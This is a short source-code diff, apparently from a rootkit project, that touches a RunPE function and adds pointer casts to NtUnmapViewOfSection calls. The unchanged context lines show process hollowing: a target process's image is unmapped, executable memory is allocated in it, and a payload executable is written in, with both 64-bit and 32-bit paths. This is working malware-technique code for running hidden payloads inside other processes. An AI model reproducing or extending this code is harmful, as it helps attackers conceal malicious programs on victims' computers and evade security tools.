@@ -735,7 +735,7 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 				// Payload bitness matches current process bitness
 
 				PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
-				R77_NtUnmapViewOfSection(processInformation.hProcess, ntHeaders->OptionalHeader.ImageBase);
+				R77_NtUnmapViewOfSection(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase);
 
 				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
@@ -807,7 +807,7 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 				// Spawn 32-bit process from this 64-bit process.
 
 				PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
-				R77_NtUnmapViewOfSection(processInformation.hProcess, ntHeaders->OptionalHeader.ImageBase);
+				R77_NtUnmapViewOfSection(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase);
 
 				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
